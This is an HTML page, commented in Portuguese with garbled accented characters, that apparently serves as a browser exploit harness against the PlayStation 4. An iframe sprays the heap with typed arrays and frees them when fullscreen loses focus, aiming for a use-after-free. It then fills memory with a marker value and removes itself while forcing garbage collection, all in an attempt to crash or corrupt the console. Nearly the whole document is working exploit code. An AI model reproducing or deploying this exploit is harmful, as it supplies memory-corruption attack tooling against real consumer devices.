<!DOCTYPE html>
<html>
<head>
    <title>PS4 Kamikaze Teardown</title>
    <style>
        body { background-color: #000; color: #aaa; font-family: sans-serif; text-align: center; }
        iframe { width: 90%; height: 400px; border: 4px solid #f00; background: #fff; margin: 20px auto; display: block;}
        #log { text-align: left; margin: 20px auto; width: 90%; border: 1px solid #555; padding: 10px; background: #111; color: #0f0; }
    </style>
</head>
<body>

<h1>KAMIKAZE TEARDOWN v2.0</h1>
<h3>Bot칚o de morte DENTRO do Iframe</h3>

<iframe id="kamikaze_frame" srcdoc="
    <html>
    <head>
        <style>
            body { background: #fee; color: #a00; text-align: center; font-family: monospace; font-weight: bold; padding: 20px; }
            button { padding: 20px 40px; font-size: 1.5em; cursor: pointer; background: #d00; color: white; border: 4px solid #500; margin: 10px; }
            button:hover { background: #f00; }
            .step { margin: 10px; padding: 10px; border: 1px dashed #f00; }
        </style>
    </head>
    <body>
        <h1>丘멆잺 ZONA DO EXPLOIT 丘멆잺</h1>
        
        <div class='step'>
            PASS 1: Encher a mem칩ria<br>
            <button onclick='prepare()'>1. PREPARAR HEAP</button>
            <div id='info_prep'>Aguardando...</div>
        </div>

        <div class='step'>
            PASSO 2: Tela cheia + OPTIONS<br>
            <button onclick='go()'>2. GATILHO (FULLSCREEN)</button>
        </div>

        <div class='step'>
            PASSO 3 (Manual): Se n칚o crashar no Options<br>
            <button onclick='suicide()'>游 MATAR ESTE IFRAME</button>
        </div>

        <script>
            var victims = [];
            var spray = [];
            const COUNT = 15000;
            const MAGIC = 2.121995791e-314; // 0x4141...
            
            function logParent(msg) {
                // Manda log para a janela preta de fora
                try { window.parent.document.getElementById('log').innerHTML += '>> ' + msg + '<br>'; } catch(e){}
            }

            function prepare() {
                logParent('Iframe: Alocando mem칩ria...');
                for(let i=0; i<COUNT; i++) {
                    let v = new Float64Array(16);
                    v.fill(1.1);
                    victims.push(v);
                }
                document.getElementById('info_prep').innerText = 'HEAP PRONTO (' + COUNT + ' arrays).';
                logParent('Iframe: Heap pronto.');
            }

            function suicide() {
                logParent('Iframe: TENTANDO SUIC칈DIO...');
                try {
                    // O Iframe pede para o Pai remover ele mesmo do DOM
                    window.parent.document.getElementById('kamikaze_frame').remove();
                    
                    // Se o c칩digo continuar rodando, for칞amos GC no pai
                    window.parent.forceGC();
                } catch(e) {
                    logParent('Erro no suic칤dio: ' + e);
                }
            }

            function go() {
                logParent('Iframe: Entrando em Fullscreen...');
                var el = document.documentElement;
                var rfs = el.webkitRequestFullscreen || el.requestFullscreen;
                rfs.call(el);

                window.onblur = function() {
                    logParent('Iframe: BLUR DETECTADO! (OPTIONS)');
                    
                    // 1. Trigger UAF (Libera mem칩ria)
                    victims = null;
                    
                    // 2. Spray (Corrompe mem칩ria)
                    for(let i=0; i<COUNT*2; i++) {
                        let s = new Float64Array(24);
                        s.fill(MAGIC);
                        spray.push(s);
                    }
                    
                    logParent('Iframe: Mem칩ria corrompida. Iniciando autodestrui칞칚o em 100ms...');

                    // 3. KAMIKAZE AUTOM츼TICO
                    // Espera um micro-segundo para o spray assentar e... BUM.
                    setTimeout(suicide, 100);
                };
            }
        </script>
    </body>
    </html>
"></iframe>

<div id="log">Logs do Sistema Principal...</div>

<script>
    // Fun칞칚o auxiliar para criar press칚o de mem칩ria vinda de fora
    window.forceGC = function() {
        document.getElementById('log').innerHTML += ">> SISTEMA: Iframe removido. For칞ando limpeza final (GC)...<br>";
        let trash = [];
        for(let i=0; i<200; i++) { trash.push(new ArrayBuffer(1024 * 1024)); }
        trash = null;
        document.getElementById('log').innerHTML += ">> SISTEMA: Se voc칡 est치 lendo isso, o console N츾O crashou.<br>";
    }
</script>

</body>
</html>
